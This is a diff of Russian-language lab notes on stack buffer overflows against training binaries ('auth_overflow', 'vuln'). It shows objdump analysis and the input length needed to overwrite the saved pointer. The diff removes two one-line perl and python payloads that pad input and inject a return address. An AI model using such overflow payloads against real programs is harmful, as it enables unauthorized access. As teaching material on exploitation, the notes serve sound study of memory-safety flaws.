@@ -1,6 +1,3 @@
-perl -e 'print "a"x32 . "\x9d\x84\x04\x08"' | ./vuln
-flag(4b), pad(12b), buf(16b), ptr(8b)
-
 Выполняем команду objdump -d auth_overflow > auth_overflow_dump.txt
 В получившемся файле нас интересует функция check_authentication:
 
@@ -77,8 +74,6 @@ strcpy перезапишет базовый указатель вызвавше
 Учитывая все вышеуказанные особенности, для взлома пароля вход должен
 составлять от 29 до 31 символов, при этом последовательность не должна включать
 нулевой символ.
-
-python -c 'print "a"*24 + "\xa7\x05\x40"' | ./auth_overflow2
 
 Выполняем аналогичную команду для auth_overflow2:
 objdump -d auth_overflow2 > auth_overflow2_dump.txt
